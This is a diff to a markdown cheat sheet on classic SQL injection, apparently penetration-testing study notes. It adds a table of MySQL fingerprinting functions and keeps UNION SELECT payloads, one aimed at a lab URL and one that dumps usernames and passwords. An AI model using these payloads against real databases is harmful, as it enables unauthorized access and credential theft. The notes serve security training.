@@ -1,4 +1,10 @@
 ## Classic SQL Injection
+| **Command** | **Description** |
+| --------------|-------------------|
+| `database()` | Prints the current database |
+| `user()`  | Print the current user |
+| `@@version` | Print the version of the database |
+| `@@datadir` | Print the path where the mysql server is located |
 
 
 
@@ -12,13 +18,10 @@ mysql> select * from users where user_id = 1 union select 1,2,3,4,5,6;
 http://demo.ine.local/sqli_2.php?movie=99 UNION SELECT NULL, @@datadir, @@version, @@version, NULL, NULL, NULL&action=go
 ```
 
-![](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/.gitbook/assets/Screenshot%20from%202018-11-17%2015-59-39.png)
 
 ```sql
 select * from users where user_id = 1 union all select 1,(select group_concat(user,0x3a,password) from users),3,4,5,6;
 ```
-
-![](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/.gitbook/assets/Screenshot%20from%202018-11-17%2016-03-00.png)
 
 ### Authentication Bypass
 
